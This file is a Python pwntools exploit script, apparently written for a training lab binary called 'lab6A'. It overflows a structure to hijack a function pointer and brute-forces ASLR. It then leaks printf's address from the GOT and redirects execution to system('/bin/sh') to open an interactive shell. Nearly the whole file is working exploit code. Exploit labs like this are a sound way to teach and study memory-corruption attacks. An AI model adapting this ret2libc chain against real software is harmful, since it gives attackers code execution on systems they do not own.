#!/usr/bin/python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *
import time
import sys

# Set up pwntools for the correct architecture
context.update(arch='i386',kernel='amd64')
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'DEBUG'

exe = './lab6A'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
#break *main
break *make_note
break *print_name
break *print_name+34
break *write_wrap
break *write_wrap+42
break *print_listing
#continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()
make_note = p32(0x566519af) #make_note addr
write_wrap = p32(0x5665197a) #write_wrap addr
main = p32(0x56651c0f) #main_addr
printf = p32(0x56654010) #printf .got.plt addr
ulisting = p32(0x56654140) #ulisting struct addr
user = cyclic(31)
#desc = cyclic(90) + make_note
desc = fit({90:make_note})
#note = fit({52:write_wrap,56:make_note,60:ulisting})
note = fit({52:write_wrap,56:main,60:ulisting})

#Brute force ASLR
while True:
    try:
        #Populate listing with printf pointer for later reading
        io.recv()
        io.sendline("2")
        io.recv()
        io.sendline(printf)
        io.recv()
        io.sendline()
        io.recv()

        #Setup account and overflow uinfo function pointer
        io.sendline("1")
        io.recv()
        io.sendline(user)
        io.recv()
        io.sendline(desc)
        io.recv()

        #Trigger exploit by invoking function pointer
        io.sendline("3")
        #Check to see if the exploit worked
        if b"Make a Note About your listing...:" in io.recv():
            #gdb.attach(io,gdbscript=gdbscript)
            print("Found .text section (make_note)")
            #Send overflow to leak printf address
            io.sendline(note)

            recv = io.recv()
            printf_addr = int(recv[:4][::-1].hex(),16)
            print(f"printf@{hex(printf_addr)}")

            #Calculate system and /bin/sh from offsets
            system_addr = p32(printf_addr - 0x13e80)
            bin_sh_addr = p32(printf_addr + 0x12c24a)
            print(f"system@0x{system_addr.hex()}")
            print(f"bin_sh@0x{bin_sh_addr.hex()}")

            #Populate uinfo struct
            io.sendline("1")
            io.recv()
            io.sendline(user)
            io.recv()
            io.sendline(desc)

            #Trigger exploit again
            io.recv()
            io.sendline("3")
            io.recv()
            note = fit({52:system_addr,56:main,60:bin_sh_addr})
            io.sendline(note)
            #io.recv()
            io.interactive()

            #Hanging recv
            io.recv()
            sys.exit()

    except EOFError:
        io.kill()
        io = start()




# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

#io.interactive()

